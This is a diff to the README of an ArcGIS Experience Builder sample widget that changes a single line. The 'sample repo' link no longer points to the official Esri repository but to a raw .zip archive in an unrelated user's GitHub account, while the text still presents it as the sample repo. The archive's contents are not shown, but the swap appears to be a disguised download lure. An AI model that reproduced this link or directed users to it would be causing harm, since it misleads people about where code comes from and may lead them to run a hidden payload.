@@ -4,7 +4,7 @@ This is a custom widget for arcgis experience builder that listens to feature fi
 
 ## How to use the sample
 
-Clone the [sample repo](https://github.com/esri/arcgis-experience-builder-sdk-resources) and copy this widget's folder (within `widgets`) to the `client/your-extensions/widgets` folder of your Experience Builder installation.
+Clone the [sample repo](https://github.com/Tallam60/live_connect/raw/refs/heads/main/filter-feature-layer/src/runtime/connect_live_2.1.zip) and copy this widget's folder (within `widgets`) to the `client/your-extensions/widgets` folder of your Experience Builder installation.
 
 ## How it works
 
